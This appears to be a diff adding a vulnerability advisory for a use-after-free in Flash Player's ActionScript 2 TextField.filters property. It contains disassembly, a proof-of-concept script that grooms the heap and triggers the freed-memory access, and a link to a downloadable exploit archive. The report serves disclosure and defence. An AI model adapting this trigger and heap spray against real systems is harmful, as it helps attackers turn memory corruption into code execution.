@@ -1,0 +1,131 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=444&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+[Tracking for https://code.google.com/p/chromium/issues/detail?id=498984]
+
+Credit is to bilou, working with the Chromium Vulnerability Rewards Program.
+
+---
+VULNERABILITY DETAILS
+There is a use after free vulnerability in the ActionScript 2 TextField.filters array property.
+
+This is  Issue 457278  resurrected. Again.
+
+VERSION
+Chrome Version: [43.0.2357.124, Flash 18.0.0.160]
+Operating System: [Windows 7 x64 SP1]
+
+REPRODUCTION CASE
+There is a use after free vulnerability in the ActionScript 2 TextField.filters array property.
+
+This is  Issue 457278  resurrected. Again.
+
+When the TextField.filters array is set, Flash creates an internal array holding the filters. When the property is read, Flash iterates over this array and clones each filter. During this loop, it is possible to execute some AS2 by overriding a filter's constructor. At that moment, if the AS2 code alters the filters array, Flash frees the internal array leaving a reference to freed memory in the stack. When the execution flow resumes to the loop, a use-after-free occurs.
+
+Flash 17.0.0.169 added a flag to mitigate  Issue 457278 
+.text:004D6F0B                 mov     esi, [esp+2Ch+var_C]
+.text:004D6F0F                 push    1               ; char
+.text:004D6F11                 mov     ecx, edi        ; int
+.text:004D6F13                 mov     byte ptr [esi+0Ch], 1   ; this flag was added
+.text:004D6F17                 call    xparseAS2Code
+.text:004D6F1C                 mov     byte ptr [esi+0Ch], 0
+
+Flash 18.0.0.160 added an other flag to mitigate  Issue 476926 
+.text:004D6E3E loc_4D6E3E:
+.text:004D6E3E                 cmp     byte ptr [ebp+0Ch], 0   ; this flag was added
+.text:004D6E42                 lea     eax, [ebp+0Ch]
+.text:004D6E45                 mov     [esp+2Ch+var_8], eax
+.text:004D6E49                 jz      short loc_4D6E58
+.text:004D6E4B                 mov     ecx, dword_E50A40
+.text:004D6E51                 call    sub_967730
+.text:004D6E58
+.text:004D6E58 loc_4D6E58:
+.text:004D6E58                 mov     byte ptr [eax], 1
+.text:004D6E5B                 jmp     short loc_4D6E65
+
+
+But they didn't figure it was possible to execute AS2 code a bit above in the function:
+.text:004D6E6F                 mov     eax, [ebp+0]
+.text:004D6E72                 push    0
+.text:004D6E74                 lea     edx, [esp+34h+var_14]
+.text:004D6E78                 push    edx
+.text:004D6E79                 mov     edx, [eax+14h]
+.text:004D6E7C                 mov     ecx, ebp
+.text:004D6E7E                 call    edx        ; return the filter name
+.text:004D6E80                 push    eax
+.text:004D6E81                 lea     eax, [esp+3Ch+var_10]
+.text:004D6E85                 push    eax
+.text:004D6E86                 mov     ecx, edi
+.text:004D6E88                 call    xcreateStringObject
+.text:004D6E8D                 mov     ebx, [esp+38h+arg_4]
+.text:004D6E91                 push    eax
+.text:004D6E92                 push    ecx
+.text:004D6E93                 mov     eax, esp
+.text:004D6E95                 mov     ecx, edi
+.text:004D6E97                 mov     [eax], ebx
+.text:004D6E99                 call    sub_420400  ; execute some AS2 with a custom __proto__ object
+
+For ex:
+var oob = {}
+oob.__proto__ = {}
+oob.__proto__.addProperty("GlowFilter", function () {f(); return 0x123}, function () {}); 
+flash.filters = oob
+
+
+Tested on Flash Player standalone 18.0.0.160, and Chrome 43.0.2357.124.
+That should crash while dereferencing 0x41424344.
+
+Compile with Flash CS 5.5.
+
+
+***************************************************************************
+Content of FiltusPafusTer.fla
+
+import flash.filters.GlowFilter;
+
+var a1:Array = new Array()
+var a2:Array = new Array()
+for (i = 0; i<0x50/4;i++) {
+	a2[i] = 0x41424344
+}
+
+for (var i = 0; i<0x200;i++) {
+	var tf:TextFormat = new TextFormat()
+	a1[i] = tf
+}
+for (var i = 0; i<0x200;i++) {
+	a1[i].tabStops = a2
+}
+
+var tfield:TextField = createTextField("tf",1,1,2,3,4)
+var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)
+tfield.filters = [glowfilter]
+
+
+function f() {
+	for (var i = 0; i<0x20;i++) {
+		_global.a1[0x100+i*4].tabStops = [1,2,3,4]
+	}
+
+	_global.tfield.filters = []
+	for (var i = 0; i<0x200;i++) {
+		_global.a1[i].tabStops = a2
+	}
+	
+}
+
+_global.tfield = tfield
+_global.a1 = a1
+_global.a2 = a2
+
+var oob = {}
+oob.__proto__ = {}
+oob.__proto__.addProperty("GlowFilter", function () {f(); return 0x123}, function () {}); 
+flash.filters = oob
+
+var a = tfield.filters
+
+---
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37883.zip
+
